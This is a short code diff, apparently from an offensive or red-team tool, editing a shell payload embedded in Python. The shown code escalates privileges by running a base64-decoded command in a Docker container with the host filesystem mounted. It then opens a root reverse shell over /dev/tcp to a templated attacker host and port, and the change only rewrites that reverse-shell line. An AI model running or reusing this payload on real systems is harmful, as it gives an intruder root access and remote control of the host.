@@ -308,7 +308,7 @@ PAYLOAD=$(echo -n $COMMAND | base64 -w0)
 docker run --rm -v /:/host/ ubuntu:latest /bin/bash -c "echo $PAYLOAD | base64 -d | /bin/bash"
 echo "new user: $(sudo whoami)"
 echo "starting escalated reverse shell..."
-nohup /bin/sh -c 'sudo /bin/bash -c "TASK={task} /bin/bash -i >& /dev/tcp/{reverse_shell_host}/{reverse_shell_port} 0>&1"' >/dev/null 2>&1 &
+nohup sudo /bin/bash -c "TASK={task} /bin/bash -i >& /dev/tcp/{reverse_shell_host}/{reverse_shell_port} 0>&1" >/dev/null 2>&1 &
 """
                 session.log("running docker escalate session...")
                 result = run_base64_payload(
